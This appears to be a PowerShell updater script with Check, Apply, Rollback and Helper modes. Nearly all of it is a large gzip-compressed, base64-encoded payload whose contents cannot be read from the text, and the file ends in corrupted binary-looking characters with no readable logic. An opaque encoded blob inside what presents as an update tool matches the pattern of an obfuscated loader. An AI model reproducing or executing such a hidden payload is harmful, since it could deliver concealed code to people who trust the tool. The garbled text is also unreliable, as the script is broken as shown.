[CmdletBinding()]
param(
    [ValidateSet('Check', 'Apply', 'Rollback', 'Helper')][string] $Mode = 'Check',
    [ValidateSet('development', 'stable', 'beta', 'pinned')][string] $Channel = 'development',
    [ValidatePattern('^[0-9a-fA-F]{40}$')][string] $TargetCommit,
    [int] $ParentPid = 0,
    [string] $PlanPath,
    [switch] $NonInteractive
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$payload = @(
    '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õ—ä–ôòM\S⁄›í÷ùô\NYYZ]”òîçZñ“Xú
Õöí ‹é÷öÕùôP\I¬à	’‹PùZãﬁNP€ùRT““
Œ[]’\SJ”ö’K⁄SQÃŒLïö–S›XPY⁄ùùLMåÀ’]õTTUêYõéMR’ÿÕ
—
ÿï—öÕPPOOI¬äHZõ⁄[à	…¬â€€\ô\‹ŸYH–€€ùô\ùNéëúõ€Pò\ŸMç›ö[ô 	^[ÿY
Bâ[ú]H‘ﬁ\›[KíSÀìY[[‹ûT›ôX[WNéõô] 	€€\ô\‹ŸY	ò[ŸJBâﬁö\H‘ﬁ\›[KíSÀê€€\ô\‹⁄[€ãëﬁö\›ôX[WNéõô] 	[ú]‘ﬁ\›[KíSÀê€€\ô\‹⁄[€ãê€€\ô\‹⁄[€ì[ŸWNéëX€€\ô\‹ Bâ›]]H‘ﬁ\›[KíSÀìY[[‹ûT›ôX[WNéõô] 
BùûH»	ﬁö\ê€‹U 	›]]
HHö[ò[H»	ﬁö\ë\‹‹ŸJ
N»	[ú]ë\‹‹ŸJ
HBâ€›\òŸHH‘ﬁ\›[Kï^ïUé[ò€Ÿ[ô◊Néõô] 	ò[ŸJKëŸ]›ö[ô 	›]]ï–\úò^J
JBâ›]]ë\‹‹ŸJ
Bâ[\[Y[ù][€àH‹ÿ‹ö\õÿ⁄◊Néê‹ôX]J	€›\òŸJBâà	[\[Y[ù][€à–õ›[ô\ò[Y]\ú¬ô^]	T’VU”—B